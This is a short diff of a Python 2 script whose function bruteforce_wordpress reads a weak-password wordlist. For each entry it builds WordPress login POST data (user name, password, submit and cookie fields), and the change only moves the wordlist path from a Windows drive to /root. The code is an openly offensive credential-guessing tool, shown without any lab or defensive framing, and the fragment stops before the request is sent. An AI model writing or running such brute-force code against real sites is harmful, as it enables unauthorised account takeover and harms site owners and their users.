@@ -13,8 +13,8 @@ import urllib2
 import re
 
 def bruteforce_wordpress(url, name, result):
-    #pwd = '/root/weak.txt'
-    pwd = 'D:\\weak.txt'
+    pwd = '/root/weak.txt'
+    # pwd = 'D:\\weak.txt'
     for line in open(pwd):
         lineline = line.strip().replace('\n', '')
         data = urllib.urlencode({'log':name,'pwd':lineline,'redirect_to':'', 'wp-submit':'%E7%99%BB%E5%BD%95', 'testcookie':'1'})
